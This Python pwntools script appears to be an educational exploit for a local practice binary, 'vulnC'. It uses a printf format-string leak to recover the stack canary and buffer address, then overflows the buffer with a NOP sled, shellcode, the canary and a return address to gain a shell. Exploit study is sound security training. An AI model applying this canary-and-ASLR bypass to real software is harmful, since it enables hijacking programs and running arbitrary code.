import struct
import pwn

# vulnC is a 64-bit dynamically linked executable
# It's stack is executable, It has a gcc canary, ASLR is turned on

# This is an example for a basic buffer overflow defeating gcc stack canaries
# This exploit uses the printf() format string vulnerability to leak stack canaries at runtime
# We are also able to discover our return address dynamically, so we can defeat ASLR

# In gdb we can see 144 is subtracted from the stack to make room for locals (including the stack canary) in the vuln_func prologue
# This is what our stack looks like at the time of the call to printf:

# [ 136/8 = 17 8-byte chunks of buff ]
# [ 8 byte canary                    ]
# [ 8 byte previous frame base ptr   ]
# [ 8 byte return address            ]

# Let's do the math:
# The first 5 values printed will be the contents of registers (rsi, rdx, rcx, r8, r9)
# The next 17 values will be from the buffer
# So, the 23rd value printed will be the stack canary

# Luckily, immediatly preceding this printf is a call to gets
# After that gets call, if our input is 17 bytes or more, rsi will contain a pointer to the start of our buffer
# So, we can steal the buffer address and defeat ASLR

target = pwn.process('./vulnC')
# pwn.gdb.attach(target, gdbscript='b *0x0000000000401261')

target.recvuntil(b'String:  \n')

send_str = b'%1$p.%23$p.'
send_str = send_str + b'a' * (17 - len(send_str)) # input needs to be at least 17 bytes for a pointer for buffer to end up in rsi during gets()
target.sendline(send_str)

buffer_addr_raw = target.recvuntil(b'.')
buffer_addr_raw = buffer_addr_raw.strip(b'.')

canary_raw = target.recvuntil(b'.')
canary_raw = canary_raw.strip(b'.')

print(f"Ret Addr: {buffer_addr_raw}")
print(f"Stack Canary: {canary_raw}")

buffer_addr = struct.pack("<Q", int(buffer_addr_raw.decode(), 16))
canary = struct.pack("<Q", int(canary_raw.decode(), 16))

# Read shellcode from file
with open("shellCode/shellcode", "rb") as file:
    shellcode = file.read()

nopsled = b'\x90' * 5

payload = nopsled # small nopsled at the start of the buffer
payload += shellcode # Fill the buffer with our shellcode
payload += b'a' *  (136 - len(payload)) # We found 136 to be the index after our buffer where we need to feed a stack canary
payload += canary
payload += b'b' * 8 # Account for the 8 bytes of previous frame's base ptr
payload += buffer_addr # push the return address, which is the address of the start of the buffer

target.recvuntil(b'String: \n')

target.sendline(payload)
target.interactive()